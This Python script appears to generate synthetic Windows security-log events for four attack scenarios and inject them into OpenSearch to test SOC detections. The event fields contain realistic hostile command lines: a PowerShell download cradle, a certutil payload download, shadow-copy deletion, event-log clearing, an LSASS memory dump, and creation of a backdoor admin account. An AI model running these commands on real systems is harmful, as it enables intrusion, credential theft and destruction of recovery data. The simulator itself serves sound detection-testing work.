#!/usr/bin/env python3
"""
simulate_attack.py — Multi-Scenario Attack Chain Simulator

Scenarios:
  original    (default) Brute-force → PS → C2 → Persistence (5 stages)
  ransomware  Phishing → Macro → VSS Delete → Encryption → C2 (6 stages)
  lateral     Foothold → Cred Dump → Pass-the-Hash → DC Pivot → Staging (5 stages)
  exfil       Login → Large Data Copy → Compress → Upload (4 stages)

Usage:
  python scripts/simulate_attack.py
  python scripts/simulate_attack.py --scenario ransomware
  python scripts/simulate_attack.py --scenario lateral
  python scripts/simulate_attack.py --scenario exfil
  python scripts/simulate_attack.py --scenario all   # Run all scenarios
"""

import argparse
import os
from datetime import datetime, timedelta, timezone

from opensearchpy import OpenSearch

OPENSEARCH_HOST = os.environ.get("OPENSEARCH_HOST", "localhost")
OPENSEARCH_PORT = int(os.environ.get("OPENSEARCH_PORT", 9200))
INDEX_NAME = f"security-logs-{datetime.now(timezone.utc).strftime('%Y.%m.%d')}"

BASE_TIME = datetime.now(timezone.utc)


def ts(minutes_offset):
    return (BASE_TIME + timedelta(minutes=minutes_offset)).isoformat()


# ===========================================================================
# SCENARIO 1: ORIGINAL — Brute-Force → PowerShell → C2 → Persistence
# ===========================================================================
def scenario_original():
    ATTACKER_IP  = "185.220.101.45"
    TARGET       = "SRV-DC-01"
    VICTIM_USER  = "agarcia"
    C2_IP        = "91.219.236.222"
    NEW_ADMIN    = "svc_support"

    events = []

    # Stage 1: Brute-Force (15 failed logins)
    for i in range(15):
        events.append({
            "@timestamp": ts(i * 0.7),
            "event": {"category": "authentication", "action": "logon_failure",
                      "outcome": "failure", "severity": 2,
                      "module": "windows_security", "dataset": "windows.security"},
            "host": {"name": TARGET, "os": {"name": "Windows Server", "version": "2019"}},
            "user": {"name": VICTIM_USER, "domain": "CORP"},
            "source": {"ip": ATTACKER_IP, "port": 49152 + i,
                       "geo": {"country_name": "Germany", "city_name": "Berlin",
                               "location": {"lat": 52.52, "lon": 13.405}}},
            "message": f"Failed logon attempt #{i+1} for {VICTIM_USER} from {ATTACKER_IP}",
            "tags": ["authentication", "brute_force", "attack_simulation"],
        })

    # Stage 2: Successful Login
    events.append({
        "@timestamp": ts(12),
        "event": {"category": "authentication", "action": "logon_success",
                  "outcome": "success", "severity": 2,
                  "module": "windows_security", "dataset": "windows.security"},
        "host": {"name": TARGET, "os": {"name": "Windows Server", "version": "2019"}},
        "user": {"name": VICTIM_USER, "domain": "CORP"},
        "source": {"ip": ATTACKER_IP, "port": 49170,
                   "geo": {"country_name": "Germany", "city_name": "Berlin",
                           "location": {"lat": 52.52, "lon": 13.405}}},
        "message": f"Successful logon for {VICTIM_USER} from {ATTACKER_IP} after multiple failures",
        "tags": ["authentication", "brute_force_success", "attack_simulation"],
    })

    # Stage 3: PowerShell download cradle
    events.append({
        "@timestamp": ts(15),
        "event": {"category": "process", "action": "process_create", "severity": 3,
                  "module": "sysmon", "dataset": "windows.sysmon"},
        "host": {"name": TARGET, "os": {"name": "Windows Server", "version": "2019"}},
        "user": {"name": VICTIM_USER, "domain": "CORP"},
        "process": {
            "name": "powershell.exe", "pid": 7892,
            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "command_line": f"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://{C2_IP}/stage2.ps1')\"",
            "parent": {"name": "cmd.exe", "pid": 4560},
        },
        "message": f"PowerShell download cradle executed by {VICTIM_USER} on {TARGET}",
        "tags": ["sysmon", "process", "suspicious", "attack_simulation"],
    })

    # Stage 4: C2 Communication
    events.append({
        "@timestamp": ts(18),
        "event": {"category": "network", "action": "network_connection", "severity": 3,
                  "module": "sysmon", "dataset": "windows.sysmon"},
        "host": {"name": TARGET, "os": {"name": "Windows Server", "version": "2019"}},
        "user": {"name": VICTIM_USER, "domain": "CORP"},
        "source": {"ip": "10.0.1.10", "port": 52341},
        "destination": {"ip": C2_IP, "port": 4444,
                        "geo": {"country_name": "Russia", "city_name": "Moscow",
                                "location": {"lat": 55.7558, "lon": 37.6173}}},
        "network": {"protocol": "tcp", "direction": "outbound", "bytes": 4096},
        "process": {"name": "powershell.exe", "pid": 7892,
                    "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
        "message": f"Outbound C2 connection from {TARGET} to {C2_IP}:4444",
        "tags": ["network", "c2", "external", "attack_simulation"],
    })

    # Stage 5: Admin Account Created
    events.append({
        "@timestamp": ts(22),
        "event": {"category": "iam", "action": "account_created", "severity": 3,
                  "module": "windows_security", "dataset": "windows.security"},
        "host": {"name": TARGET, "os": {"name": "Windows Server", "version": "2019"}},
        "user": {"name": VICTIM_USER, "domain": "CORP"},
        "process": {"name": "net.exe", "pid": 9012,
                    "executable": "C:\\Windows\\System32\\net.exe",
                    "command_line": f"net user {NEW_ADMIN} P@ssw0rd123! /add"},
        "message": f"A user account was created: {NEW_ADMIN} by {VICTIM_USER} on {TARGET} (added to Administrators)",
        "tags": ["iam", "account_management", "admin_change", "attack_simulation"],
    })

    return events, "Original — Brute-Force → PowerShell → C2 → Persistence"


# ===========================================================================
# SCENARIO 2: RANSOMWARE KILL CHAIN
# ===========================================================================
def scenario_ransomware():
    ATTACKER_IP = "45.33.32.156"
    TARGET      = "WS-PC-002"
    VICTIM_USER = "bjohnson"
    C2_IP       = "194.165.16.77"

    events = []

    # Stage 1: Phishing email opens Word doc (macro execution)
    events.append({
        "@timestamp": ts(0),
        "event": {"category": "process", "action": "process_create", "severity": 2,
                  "module": "sysmon", "dataset": "windows.sysmon"},
        "host": {"name": TARGET, "os": {"name": "Windows", "version": "10.0.19045"}},
        "user": {"name": VICTIM_USER, "domain": "CORP"},
        "process": {
            "name": "WINWORD.EXE", "pid": 4422,
            "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "command_line": "WINWORD.EXE /n \"C:\\Users\\bjohnson\\Downloads\\Invoice_Q4_2024.doc\"",
            "parent": {"name": "outlook.exe", "pid": 3310},
        },
        "message": f"Word opened suspicious document from email attachment on {TARGET}",
        "tags": ["sysmon", "process", "phishing", "attack_simulation", "ransomware"],
    })

    # Stage 2: Word spawns cmd (macro payload)
    events.append({
        "@timestamp": ts(1),
        "event": {"category": "process", "action": "process_create", "severity": 3,
                  "module": "sysmon", "dataset": "windows.sysmon"},
        "host": {"name": TARGET, "os": {"name": "Windows", "version": "10.0.19045"}},
        "user": {"name": VICTIM_USER, "domain": "CORP"},
        "process": {
            "name": "wscript.exe", "pid": 5566,
            "executable": "C:\\Windows\\System32\\wscript.exe",
            "command_line": "wscript.exe C:\\Users\\bjohnson\\AppData\\Temp\\dropper.vbs",
            "parent": {"name": "WINWORD.EXE", "pid": 4422},
        },
        "message": f"wscript.exe spawned by WINWORD.EXE — macro execution detected on {TARGET}",
        "tags": ["sysmon", "process", "suspicious", "macro", "attack_simulation", "ransomware"],
    })

    # Stage 3: Download ransomware payload via certutil
    events.append({
        "@timestamp": ts(2),
        "event": {"category": "process", "action": "process_create", "severity": 3,
                  "module": "sysmon", "dataset": "windows.sysmon"},
        "host": {"name": TARGET, "os": {"name": "Windows", "version": "10.0.19045"}},
        "user": {"name": VICTIM_USER, "domain": "CORP"},
        "process": {
            "name": "certutil.exe", "pid": 6789,
            "executable": "C:\\Windows\\System32\\certutil.exe",
            "command_line": f"certutil.exe -urlcache -split -f http://{C2_IP}/ransom.exe C:\\Temp\\svchost32.exe",
            "parent": {"name": "wscript.exe", "pid": 5566},
        },
        "message": f"certutil.exe used to download file from {C2_IP} on {TARGET}",
        "tags": ["sysmon", "certutil", "lolbin", "attack_simulation", "ransomware"],
    })

    # Stage 4: VSS Shadow Copy Deletion (classic ransomware move)
    events.append({
        "@timestamp": ts(5),
        "event": {"category": "process", "action": "process_create", "severity": 3,
                  "module": "sysmon", "dataset": "windows.sysmon"},
        "host": {"name": TARGET, "os": {"name": "Windows", "version": "10.0.19045"}},
        "user": {"name": VICTIM_USER, "domain": "CORP"},
        "process": {
            "name": "vssadmin.exe", "pid": 7890,
            "executable": "C:\\Windows\\System32\\vssadmin.exe",
            "command_line": "vssadmin.exe delete shadows /all /quiet",
            "parent": {"name": "svchost32.exe", "pid": 6800},
        },
        "message": f"VSS shadow copies deleted on {TARGET} — ransomware indicator",
        "tags": ["sysmon", "ransomware", "vss_deletion", "attack_simulation"],
    })

    # Stage 5: Windows Event Log Cleared
    events.append({
        "@timestamp": ts(6),
        "event": {"category": "process", "action": "process_create", "severity": 3,
                  "module": "windows_security", "dataset": "windows.security"},
        "host": {"name": TARGET, "os": {"name": "Windows", "version": "10.0.19045"}},
        "user": {"name": VICTIM_USER, "domain": "CORP"},
        "process": {
            "name": "wevtutil.exe", "pid": 8001,
            "executable": "C:\\Windows\\System32\\wevtutil.exe",
            "command_line": "wevtutil.exe cl System && wevtutil.exe cl Security",
            "parent": {"name": "svchost32.exe", "pid": 6800},
        },
        "message": f"Windows Event Logs cleared on {TARGET} — anti-forensics",
        "tags": ["defense_evasion", "log_cleared", "attack_simulation", "ransomware"],
    })

    # Stage 6: C2 beacon after encryption
    events.append({
        "@timestamp": ts(10),
        "event": {"category": "network", "action": "network_connection", "severity": 3,
                  "module": "sysmon", "dataset": "windows.sysmon"},
        "host": {"name": TARGET, "os": {"name": "Windows", "version": "10.0.19045"}},
        "user": {"name": VICTIM_USER, "domain": "CORP"},
        "source": {"ip": "10.0.1.25", "port": 51234},
        "destination": {"ip": C2_IP, "port": 443,
                        "geo": {"country_name": "Iran", "city_name": "Tehran",
                                "location": {"lat": 35.6892, "lon": 51.389}}},
        "network": {"protocol": "tcp", "direction": "outbound", "bytes": 512},
        "process": {"name": "svchost32.exe", "pid": 6800,
                    "executable": "C:\\Temp\\svchost32.exe"},
        "message": f"Ransomware C2 beacon from {TARGET} to {C2_IP}:443",
        "tags": ["network", "c2", "external", "ransomware", "attack_simulation"],
    })

    return events, "Ransomware Kill Chain — Phishing → Macro → VSS Delete → Encryption → C2"


# ===========================================================================
# SCENARIO 3: LATERAL MOVEMENT
# ===========================================================================
def scenario_lateral():
    ATTACKER_IP  = "185.220.101.45"
    ENTRY_HOST   = "WS-PC-001"
    PIVOT_HOST   = "WS-PC-004"
    TARGET_DC    = "SRV-DC-01"
    VICTIM_USER  = "jsmith"
    ADMIN_USER   = "admin"

    events = []

    # Stage 1: Initial foothold via PowerShell
    events.append({
        "@timestamp": ts(0),
        "event": {"category": "process", "action": "process_create", "severity": 3,
                  "module": "sysmon", "dataset": "windows.sysmon"},
        "host": {"name": ENTRY_HOST, "os": {"name": "Windows", "version": "10.0.19045"}},
        "user": {"name": VICTIM_USER, "domain": "CORP"},
        "process": {
            "name": "powershell.exe", "pid": 3344,
            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
            "parent": {"name": "explorer.exe", "pid": 1234},
        },
        "message": f"Encoded PowerShell on {ENTRY_HOST} — initial foothold established",
        "tags": ["sysmon", "process", "suspicious", "lateral_movement", "attack_simulation"],
    })

    # Stage 2: LSASS memory dump (credential harvesting)
    events.append({
        "@timestamp": ts(3),
        "event": {"category": "process", "action": "process_create", "severity": 3,
                  "module": "sysmon", "dataset": "windows.sysmon"},
        "host": {"name": ENTRY_HOST, "os": {"name": "Windows", "version": "10.0.19045"}},
        "user": {"name": VICTIM_USER, "domain": "CORP"},
        "process": {
            "name": "rundll32.exe", "pid": 4455,
            "executable": "C:\\Windows\\System32\\rundll32.exe",
            "command_line": "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\Temp\\lsass.dmp full",
            "parent": {"name": "powershell.exe", "pid": 3344},
        },
        "message": f"LSASS memory dump via rundll32 on {ENTRY_HOST} — credential harvesting",
        "tags": ["sysmon", "lsass_dump", "credential_access", "attack_simulation"],
    })

    # Stage 3: Lateral movement via SMB (pass-the-hash to pivot host)
    events.append({
        "@timestamp": ts(8),
        "event": {"category": "network", "action": "network_connection", "severity": 3,
                  "module": "sysmon", "dataset": "windows.sysmon"},
        "host": {"name": ENTRY_HOST, "os": {"name": "Windows", "version": "10.0.19045"}},
        "user": {"name": ADMIN_USER, "domain": "CORP"},
        "source": {"ip": "10.0.1.11", "port": 49200},
        "destination": {"ip": "10.0.1.40", "port": 445},
        "network": {"protocol": "smb", "direction": "outbound", "bytes": 8192},
        "process": {"name": "powershell.exe", "pid": 3344,
                    "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
        "message": f"SMB lateral movement from {ENTRY_HOST} to {PIVOT_HOST} using admin credentials",
        "tags": ["network", "smb", "lateral_movement", "attack_simulation"],
    })

    # Stage 4: Remote code execution on Domain Controller
    events.append({
        "@timestamp": ts(12),
        "event": {"category": "process", "action": "process_create", "severity": 3,
                  "module": "sysmon", "dataset": "windows.sysmon"},
        "host": {"name": TARGET_DC, "os": {"name": "Windows Server", "version": "2019"}},
        "user": {"name": ADMIN_USER, "domain": "CORP"},
        "process": {
            "name": "cmd.exe", "pid": 6677,
            "executable": "C:\\Windows\\System32\\cmd.exe",
            "command_line": "cmd.exe /c net group \"Domain Admins\" /domain",
            "parent": {"name": "services.exe", "pid": 688},
        },
        "message": f"Remote cmd.exe on DC {TARGET_DC} — domain admin enumeration",
        "tags": ["sysmon", "process", "dc_access", "lateral_movement", "attack_simulation"],
    })

    # Stage 5: Data staging on DC
    events.append({
        "@timestamp": ts(16),
        "event": {"category": "process", "action": "process_create", "severity": 3,
                  "module": "sysmon", "dataset": "windows.sysmon"},
        "host": {"name": TARGET_DC, "os": {"name": "Windows Server", "version": "2019"}},
        "user": {"name": ADMIN_USER, "domain": "CORP"},
        "process": {
            "name": "robocopy.exe", "pid": 7788,
            "executable": "C:\\Windows\\System32\\robocopy.exe",
            "command_line": "robocopy.exe \\\\SRV-FILE-01\\shares C:\\Temp\\staging /E /COPYALL /MT:16",
            "parent": {"name": "cmd.exe", "pid": 6677},
        },
        "message": f"Robocopy mass data staging on {TARGET_DC} — copying shared drive",
        "tags": ["sysmon", "process", "data_staging", "lateral_movement", "attack_simulation"],
    })

    return events, "Lateral Movement — Foothold → Cred Dump → SMB → DC Pivot → Data Staging"


# ===========================================================================
# SCENARIO 4: DATA EXFILTRATION
# ===========================================================================
def scenario_exfil():
    TARGET     = "SRV-FILE-01"
    VICTIM     = "svc_backup"
    EXFIL_IP   = "104.21.45.12"

    events = []

    # Stage 1: Legitimate-looking large file access
    events.append({
        "@timestamp": ts(0),
        "event": {"category": "authentication", "action": "logon_success",
                  "outcome": "success", "severity": 1,
                  "module": "windows_security", "dataset": "windows.security"},
        "host": {"name": TARGET, "os": {"name": "Windows Server", "version": "2019"}},
        "user": {"name": VICTIM, "domain": "CORP"},
        "source": {"ip": "10.0.2.88", "port": 50022},
        "message": f"Service account {VICTIM} logged into file server {TARGET} outside business hours",
        "tags": ["authentication", "off_hours", "exfiltration", "attack_simulation"],
    })

    # Stage 2: Compress large dataset
    events.append({
        "@timestamp": ts(2),
        "event": {"category": "process", "action": "process_create", "severity": 2,
                  "module": "sysmon", "dataset": "windows.sysmon"},
        "host": {"name": TARGET, "os": {"name": "Windows Server", "version": "2019"}},
        "user": {"name": VICTIM, "domain": "CORP"},
        "process": {
            "name": "7z.exe", "pid": 4433,
            "executable": "C:\\Program Files\\7-Zip\\7z.exe",
            "command_line": "7z.exe a -tzip -p$3cr3tPassw0rd C:\\Temp\\archive.zip D:\\Shares\\HR\\ D:\\Shares\\Finance\\",
            "parent": {"name": "cmd.exe", "pid": 3300},
        },
        "message": f"7-Zip compressing HR and Finance shares with password on {TARGET}",
        "tags": ["sysmon", "process", "compression", "data_staging", "exfiltration", "attack_simulation"],
    })

    # Stage 3: Large outbound transfer
    events.append({
        "@timestamp": ts(5),
        "event": {"category": "network", "action": "network_connection", "severity": 3,
                  "module": "sysmon", "dataset": "windows.sysmon"},
        "host": {"name": TARGET, "os": {"name": "Windows Server", "version": "2019"}},
        "user": {"name": VICTIM, "domain": "CORP"},
        "source": {"ip": "10.0.2.50", "port": 52100},
        "destination": {"ip": EXFIL_IP, "port": 443,
                        "geo": {"country_name": "China", "city_name": "Beijing",
                                "location": {"lat": 39.9042, "lon": 116.4074}}},
        "network": {"protocol": "https", "direction": "outbound", "bytes": 524288000},  # 500MB
        "process": {"name": "curl.exe", "pid": 5544,
                    "executable": "C:\\Windows\\System32\\curl.exe"},
        "message": f"500MB outbound transfer from {TARGET} to {EXFIL_IP}:443 — data exfiltration",
        "tags": ["network", "external", "exfiltration", "large_transfer", "attack_simulation"],
    })

    # Stage 4: Cleanup — delete local copy
    events.append({
        "@timestamp": ts(8),
        "event": {"category": "process", "action": "process_create", "severity": 2,
                  "module": "sysmon", "dataset": "windows.sysmon"},
        "host": {"name": TARGET, "os": {"name": "Windows Server", "version": "2019"}},
        "user": {"name": VICTIM, "domain": "CORP"},
        "process": {
            "name": "cmd.exe", "pid": 6600,
            "executable": "C:\\Windows\\System32\\cmd.exe",
            "command_line": "cmd.exe /c del /f /q C:\\Temp\\archive.zip && wevtutil.exe cl Security",
            "parent": {"name": "cmd.exe", "pid": 3300},
        },
        "message": f"Cleanup: archive deleted and Security log cleared on {TARGET}",
        "tags": ["defense_evasion", "log_cleared", "exfiltration", "attack_simulation"],
    })

    return events, "Data Exfiltration — Login → Compress → Large Transfer → Cleanup"


# ===========================================================================
# Runner
# ===========================================================================
SCENARIOS = {
    "original":  scenario_original,
    "ransomware": scenario_ransomware,
    "lateral":   scenario_lateral,
    "exfil":     scenario_exfil,
}


def run_scenario(client, name: str, func):
    events, description = func()
    print(f"\n{'=' * 60}")
    print(f"  Scenario: {description}")
    print(f"{'=' * 60}")
    print(f"  Events: {len(events)}")
    print(f"  Index:  {INDEX_NAME}")

    for event in events:
        client.index(index=INDEX_NAME, body=event)

    client.indices.refresh(index=INDEX_NAME)
    count = client.count(index=INDEX_NAME)["count"]
    print(f"[✓] Injected {len(events)} events. Total docs in index: {count}")
    return len(events)


def main():
    parser = argparse.ArgumentParser(description="SOC Dashboard — Attack Scenario Simulator")
    parser.add_argument(
        "--scenario",
        choices=list(SCENARIOS.keys()) + ["all"],
        default="original",
        help="Attack scenario to run (default: original)",
    )
    args = parser.parse_args()

    print("=" * 60)
    print("  SOC Attack Simulation Engine")
    print("=" * 60)

    client = OpenSearch(
        hosts=[{"host": OPENSEARCH_HOST, "port": OPENSEARCH_PORT}],
        http_compress=True, use_ssl=False, verify_certs=False, ssl_show_warn=False,
    )
    info = client.info()
    print(f"[✓] Connected to OpenSearch {info['version']['number']}")

    total_events = 0
    if args.scenario == "all":
        for name, func in SCENARIOS.items():
            total_events += run_scenario(client, name, func)
    else:
        total_events += run_scenario(client, args.scenario, SCENARIOS[args.scenario])

    print(f"\n[✓] Simulation complete. {total_events} total events injected into '{INDEX_NAME}'")
    print("\n[*] Next steps:")
    print("    1. Run: python scripts/detection_engine.py")
    print("    2. Run: python scripts/threat_intel.py")
    print("    3. Run: python scripts/notifier.py")
    print("    4. Open: http://localhost:5601")


if __name__ == "__main__":
    main()
